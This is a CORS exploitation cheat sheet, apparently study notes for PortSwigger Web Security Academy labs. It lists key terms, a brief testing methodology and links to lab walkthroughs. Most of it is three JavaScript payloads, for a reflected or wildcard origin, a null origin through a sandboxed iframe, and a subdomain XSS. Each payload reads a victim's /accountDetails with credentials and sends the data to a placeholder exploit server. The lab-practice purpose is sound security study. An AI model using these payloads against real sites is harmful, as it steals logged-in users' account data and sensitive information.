# CORS - CHEATSHEET + MOST IMPORTANT LABS

## Key Terms

```bash
 - CORS -> Cross-Origin Resource Sharing
 - Origin
 - Access-Control-Allow-Origin: '*'
 - same-origin policy (SOP).
 - sandbox , srcdoc
```

## Walkthrough - Most Important Labs

- [CORS with basic origin reflection](CORS-with-basic-origin-reflection.md)
- [CORS with trusted NULL origin](CORS-null-origin.md)
- [CORS + XSS in trusted subdomains ](CORS-origin-subdomain-xss.md)


## Methodology

```bash
Allow-Control-Allow-Origin?
	- Change Origin header -> arbitory values
						   -> null 
						   -> arbitory subdomain -> search legit subdomain in the web  

```

## Cheat Sheet

```js
// ---------- Access-Control-Allow-Origin * ---------- //
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('GET','https://<IP>/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='https://<EXPLOIT-SV>/?data='+encodeURIComponent(btoa(this.responseText));
    };
</script>

// ---------- Origin: null ---------- //
<iframe sandbox="allow-scripts" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload =  function() {
        location='https://<EXPLOIT-SV>/?data='+encodeURIComponent(btoa(this.responseText));
    };
    req.open('GET','https://IP>/accountDetails',true);
    req.withCredentials = true;
    req.send();
</script>"></iframe>

// ---------- Origin: subdomain + XSS  ----------//
<script>
    document.location="http://<subdomain.<IP>/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://<IP>.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://<EXPLOIT-SERVER>/log?key='%2b btoa(this.responseText) };%3c/script>&storeId=1"
</script>

```

